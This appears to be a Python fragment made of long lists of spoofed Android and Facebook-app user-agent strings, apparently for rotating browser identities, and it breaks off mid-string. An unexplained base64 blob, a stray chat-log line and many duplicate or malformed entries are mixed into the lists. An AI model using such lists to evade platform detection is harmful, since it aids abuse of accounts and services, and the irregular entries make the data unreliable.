ua09= ["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-T875 Build/RP1A.200 720.012) AppleWebKit /537.36 (KHTML, like Gecko) Version /4.0 Chrome /96.0.4664.104 Safari/537.36 GNews Android /2022034746 UNTRUSTED/1.0",b'rJLw2/F3v0PfZ+F88lY2OO393v/jb/tn/9E8UqHfu+y5+fXQtMyf623eEXAumpu77SWYBSAkbzDsNmOGxO4qRbL4bSRcNzAYvVmnUoEh9s1SzlaPvdVYJOarnmlFTEPf6FKmEZwkS4hkdrFrJL9yMk4kSf8SjmhF1uswHbWNjoCTvTbCRXnJiUJidV8K0aCguz14iRl9Xw9Q76KAGt6m4xH3sckRYqgcrIu5wOJIhbKd5LKwmEB4WSbyFjrpgirsOaVMR7cWgAUclQdxNWZL+VLAQpNt3V4OtBUTFa2bfxkz4EUw2k/FNp3wjXia+fANSlCB0joFGzZiX/w9kPEEKoUkDQneV1ngvvZCTbA3gxeroxHtKIku/F6walDbrB7RVPyu04SpZ2rqSJmw87EmfaR/DfDylxjbV7QyBO/eTuTVHwloayU0cnouKV9Qer3mlPbtAe/KoAUcG40b2afoMPZ5VJq+P0jlXC0o5r+QrPH1Wxjz3HXGw2TWH6CjqcCtgL56PfVPppkZaSoGuoIlFrIYGvvDLvthj75bV/0ry9BMn75T57j58MChDtc1H8Yw53+/x9wxg3r6/C94ZxROynyKj7Edi2cQgK5CG5eixFCaQjEEop9Apkqqa2EiBQhx5OcgGHWRAA0mSmjkdxJe',"Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]","Mozilla/5.0 (Linux; U; Android 9; LGL722DL Build/PKQ1.190302.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 OPR/60.0.2254.59405","Mozilla/5.0 (Linux; Android 10; Nokia 7.2 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/264.0.0.44.111;]"]
ua05= ['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']
ua06= ['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']
ugen2=['Mozilla/5.0 (Android 2.2; id-id; HTC Desire)/GoBrowser','Mozilla/5.0 (Android 2.2; id-id; HTC Desire)/GoBrowser']
ugen=['Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N975U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N971N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 1…', '[18.36, 15/3/2022] AOREC: Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SCV45) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; en-au; SC-04L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N980F/N980FXXU1DUB5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N971N/KSU1FUCD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au;  SAMSUNG SM-M625F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au;  SAMSUNG SM-G988B/G988BXXU7DUC7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au;  SAMSUNG SM-A8050) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG IN2020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SC-42A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T597W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-N960F/N960FXXS8FUC4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G988U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A600FN/A600FNXXU6CTF2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A515F/A515FXXU2ATB1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A505FN 6/128) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.2 Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A105M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A013F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-N935S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-M205G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J530GM) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A530F/A530FXXU4CSC6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-T835) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G960F/G960FXXS2BRK3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G960F/G960FXXS2BRK3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G935F/G935FXXS2DRAA) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G920K/KKS3ETJ1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-C9000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N975U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N971N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N770F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M317F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M317F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G973U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A716U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A505FM) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J720M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; Pixel C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; NX659J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-M107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A102U1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0; en-au; SAMSUNG SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; en-au; SAMSUNG SM-G550FY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-N9200) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; FRD-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-T870) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-P615) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N985F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N971N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N970F/N970FXXS6EUA1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N770F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M317F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G977N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G781B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-F700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; CPH2009) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G980F/G980FXXU3ATFG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G973F/G973FXXS3BSL4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G960F/G960FXXSDFTL1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A908N/KSU3CTL3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A505FN/A505FNXXS6BUA5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A426B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A217F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A015F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J710F/J710FXXS6CTJ2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J327R6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-J330FN/J330FNXXU3BRL1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A530F/A530FXXU3BRL8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A530F/A530FXXS3BRH1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-J327U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J710F/J710FXXS6CTJ2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J327R6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-J330FN/J330FNXXU3BRL1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A530F/A530FXXS3BRH1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-J327U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; en-au; SAMSUNG SM-J320FN/J320FNXXU0ARE1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11 en-au;; SAMSUNG SM-M307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G980F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A515F/A515FXXU4DUB2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T725) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-S111DL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M105G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J610G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J610FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J400M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G965N/KSU3FTJ2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-F700U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A202F/A202FXXS3BTI2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A115M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A105FN/A105FNXXS4BTG1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-T827V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J260A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A307GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-T585/T585XXS5CSH1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G925K/KKU3ERG1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.0.2; en-au; SAMSUNG SM-P905) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M317F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M215F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G985F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A505GN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T505) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T307U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M317F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J400F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A405FN/A405FNXXS3BTI3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J810F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J330FN/J330FNXXU4CTH2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G950F/G950FXXSBDUA3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A605FN) AppleWebKit/537.36 